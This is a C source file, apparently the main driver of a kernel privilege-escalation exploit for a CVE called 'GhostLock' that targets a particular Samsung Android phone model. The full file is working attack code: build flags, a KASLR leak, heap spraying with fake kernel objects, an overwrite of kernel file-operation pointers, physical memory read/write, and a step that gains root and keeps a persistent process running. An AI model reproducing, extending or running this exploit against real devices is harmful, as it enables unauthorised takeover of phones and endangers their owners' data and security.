/*
 * CVE-2026-43499 ("GhostLock") — New exploit driver for q7mq (SM-F968N)
 *
 * This is a clean orchestration driver that reuses the battle-tested primitives
 * from the existing codebase (util.c, slide_app.c, fops.c, pipe.c, root.c) but
 * with a corrected flow that adds NON-CIRCULAR VERIFICATION at every stage.
 *
 * Key improvement: the p0 pipe oracle gate is used to verify the trigger works
 * BEFORE attempting the fops write, so we can distinguish "trigger failed" from
 * "configfs trampoline broken".
 *
 * Build (replaces main.c in the APP_PAYLOAD link):
 *   aarch64-linux-android35-clang -DAPP_PAYLOAD=1 -DAPP_PHYS_P0_ORACLE=1 \
 *     -fPIC -Oz -g0 -fno-unwind-tables -fno-asynchronous-unwind-tables \
 *     -ffunction-sections -fdata-sections -Wl,--gc-sections -Wl,--icf=all -s \
 *     -Isrc -DTARGET_HEADER='"targets/q7mq-F968NKSS6BZG3/target.h"' \
 *     src/cleanroom/driver.c src/util.c src/slide_app.c src/fops.c \
 *     src/pipe.c src/root.c src/preload.c \
 *     -shared -pthread -o cve-2026-43499-app.so
 */

#include "common.h"

/* Globals normally defined in main.c — needed by util.c, slide_app.c, etc. */
uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

/* ------------------------------------------------------------------ */
/* Stage 1: KASLR leak                                                 */
/* ------------------------------------------------------------------ */

static int stage_kaslr_leak(void) {
  pr_info("[stage1] KASLR leak starting\n");
  if (!slide_leak_kernel_base()) {
    pr_error("[stage1] KASLR leak failed\n");
    return 0;
  }
  pr_success("[stage1] KASLR leak ok base=%016zx slide=%016zx\n",
             kaslr_base, kaslr_slide);
  return 1;
}

/* ------------------------------------------------------------------ */
/* Stage 2: Pipe page preparation (for physrw + p0 oracle)             */
/* ------------------------------------------------------------------ */

static int stage_pipe_prepare(void) {
  pr_info("[stage2] pipe page preparation starting\n");

  /* Stage 1's p0 oracle already called prepare_pipe_buffer_page() and
   * set pipebuf_page_base.  Re-running the KernelSnitch sk_buff leak
   * on a heap that was already sprayed/disturbed causes a kernel panic.
   * Skip if the base is already valid. */
  if (is_direct_ptr(pipebuf_page_base)) {
    pr_success("[stage2] pipe page already prepared base=%016zx (from stage1)\n",
               pipebuf_page_base);
    return 1;
  }

  reset_pipe_attempt();
  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    pr_error("[stage2] pipe page leak failed base=%016zx\n",
             pipebuf_page_base);
    return 0;
  }
  pr_success("[stage2] pipe page ok base=%016zx\n", pipebuf_page_base);
  return 1;
}

/* ------------------------------------------------------------------ */
/* Stage 3: Spray page preparation (fake objects)                      */
/* ------------------------------------------------------------------ */

static int stage_spray_prepare(void) {
  pr_info("[stage3] spray page preparation starting\n");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) {
    pr_error("[stage3] spray page preparation failed\n");
    return 0;
  }
  pr_success("[stage3] spray page ok base=%016zx fake_fops=%016zx "
             "fake_lock=%016zx fake_w0=%016zx\n",
             page_base, fake_fops, fake_lock, fake_w0);
  return 1;
}


/* ------------------------------------------------------------------ */
/* Stage 4: fops write — ONE trigger per process (matches upstream)     */
/* ------------------------------------------------------------------ */

static int stage_fops_write(void) {
  pr_info("[stage4] fops write starting\n");

  uintptr_t misc_fops_addr = runtime_fops_alias();
  pr_info("[stage4] target=%016zx value=%016zx\n",
          misc_fops_addr, (uintptr_t)fake_fops);

  /* Fire exactly ONE trigger per process. The preload supervisor
   * (preload.c) forks up to 24 fresh processes, each calling
   * run_exploit once. Multiple triggers in a single process
   * accumulate stale PI chain state → kernel panic. */
  int triggered = app_trigger_fops_slide_route();
  pr_info("[stage4] trigger=%d\n", triggered);

  if (!triggered) {
    pr_error("[stage4] trigger failed\n");
    return 0;
  }

  /* try_cfi_stage does the FULL post-exploit chain:
   * verify fops → configfs write/read → pipe physrw → root */
  int verified = try_cfi_stage();

  pr_info("[stage4] cfi verified=%d step=%d errno=%d dirty=%d\n",
          verified, cfi_last_step, cfi_last_errno, cfi_dirty_seen);

  if (verified || cfi_dirty_seen) {
    pr_success("[stage4] fops write + physrw + root complete\n");
    return 1;
  }

  pr_error("[stage4] fops write failed step=%d errno=%d\n",
           cfi_last_step, cfi_last_errno);
  return 0;
}
/* ------------------------------------------------------------------ */
/* Main exploit entry point                                            */
/* ------------------------------------------------------------------ */

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();
  pin_to_core(CORE);

  pr_success("=== CVE-2026-43499 GhostLock new driver (q7mq) ===\n");

  /* Stage 1: KASLR */
  if (!stage_kaslr_leak()) return 1;

  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx\n",
               kaslr_base, kaslr_slide);
    return 0;
  }

  /* Stage 2: Pipe page */
  if (!stage_pipe_prepare()) return 1;

  /* Stage 3: Spray page */
  if (!stage_spray_prepare()) return 1;

  /* Stage 4: fops write + physrw + root (single trigger) */
  if (!stage_fops_write()) return 1;

  /* Success — kill pipe prep child, spawn keeper */
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }

  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);

  if (exploit_ok) {
    pid_t keeper = fork();
    if (keeper == 0) {
      prctl(PR_SET_PDEATHSIG, SIGKILL);
      for (;;) sleep(86400);
    }
    pr_success("stability keeper pid=%d\n", keeper);
    pr_success("=== exploit completed done=1 root=1 ===\n");
  }

  return exploit_ok ? 0 : 1;
}
